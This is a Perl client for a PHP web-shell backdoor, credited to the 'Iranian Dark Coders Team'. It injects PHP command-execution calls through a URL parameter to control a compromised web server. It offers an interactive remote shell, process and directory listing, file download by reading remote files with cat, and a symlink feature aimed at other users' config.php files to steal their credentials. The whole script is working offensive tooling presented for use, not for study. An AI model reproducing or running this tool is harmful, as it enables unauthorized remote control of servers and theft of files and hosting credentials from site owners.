#IDC php BackDoor
#Iranian Dark Coders Team
#WwW.IDC-TeaM.NeT
#Coded BY M.R.S.CO 
#We Are M.R.S.CO,N3O,UB313,Black.Hack3r
#Friends : G3n3Rall,MR.CILILI,BlacK.King,Nafsh,b3hz4d,E2MA3N,Skote_Vahshat,Bl4ck.Viper,Mr.Xpr
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print q (          

              __          __         __          
  |  | _|_   {_ |_  _||  |__} _  _| |  \ _  _  _ 
  |/\|{-|_}  __}| }{-||  |__}{_|{_|{|__/{_}{_}|  

                --=[Web Shell BackDoor]
        +---++---==[Version : 1.1]
        +---++---==[Coded by : M.R.S.CO]
        +---++---==[WwW.IDC-TeaM.Net]
                --=[Iranian Dark Coders Team]
);
use LWP::Simple;
print "\nEnter Shell URL : "; 
chomp($url=<STDIN>);

print "\nEnter UserName : "; 
chomp($usr=<STDIN>);

print "Enter PassWord : "; 
chomp($pass=<STDIN>);


print "\nStart analyze shell\n";
@fun=("system","passthru","exec","shell_exec");
$tf="false";
foreach(@fun)
{
	$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('echo www.idc-team.net');";
	if ($source =~ m/idc-team/i){
		print "\nConected\nFor more information Enter \"help\"";
		do {
			print "\nWSB : ";
			chomp($cmd=<STDIN>);
			if ($cmd=~"help")
			{
print q (
================================================================

  command     Description
  -------    --------------------------
  help       The help command display the help menu 
  getuid     The 'getuid' command will display the user 
  lpwd       display the filename of the current working directory
  ps         The 'ps' command  display the list of running processes.
  shell      It display the standard shell
  dir        The 'dir' command List  information  about  the FILEs
  download   The 'download' command downloads a file from the remote machine
  sym        The 'sym' command create a symlink
);
      			}elsif ($cmd=~"getuid"){
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('id');";
				print "\nUser id = $source";
			}elsif ($cmd=~"dir"){
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('ls -la');";
				print "\n $source";
      			}elsif ($cmd=~"lpwd"){
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('pwd');";
				print "\n$source";
			}elsif ($cmd=~"ps"){
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('ps -A');";
				print "\n$source";
			}elsif ($cmd=~"exit"){
				exit 0;
			}elsif ($cmd=~"sym"){
				print "Enter Target Path (/home/idc/public_html/config.php)\nEnter Target Path : ";
				chomp($target=<STDIN>);
				print "\nEnter symlink Path (/home/me/public_html/sym.txt)\nEnter symlink Path : ";
				chomp($sym=<STDIN>);
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('ln -s $target $sym');";
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_(\'perl -e \"symlink('$target','$sym')\"\');";
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=symlink('$target','$sym');";
				print "\nSymlink \"$sym\" Was Created;)\n";
			}elsif ($cmd=~"download"){
				print "Enter File Path (/home/idc/public_html/test.zip)\nEnter File Path : ";
				chomp($ff=<STDIN>);
				print "\nEnter Save Path : ";
				chomp($fp=<STDIN>);
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_('cat $ff');";
				open (fdl, '>>'.$fp);
				print fdl "$source";
				close (fdl); 
				print "\File \"$ff\" Was Downloaded to $fp\n";
			}elsif ($cmd=~"shell"){
				$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_(\"uname -an\");";
				print "\n$source";
				do {
					print "\ncmd : ";
					chomp($cm=<STDIN>);
					$source=get $url."?usr=".$usr."&pass=".$pass."&idc=$_(\"$cm\");";
					print "\n$source";
					if ($cm=~"exit"){goto ou;}
				}while ($==1)  
			}else{
				print "\"$cmd\" Command NotFound 404;) \nFor more information Enter \"help\"";
			}
	ou:;
		}while ($==1)
	}
$tf="true";
}
if($tf="true") {print "Cant connect to server !!\n";}
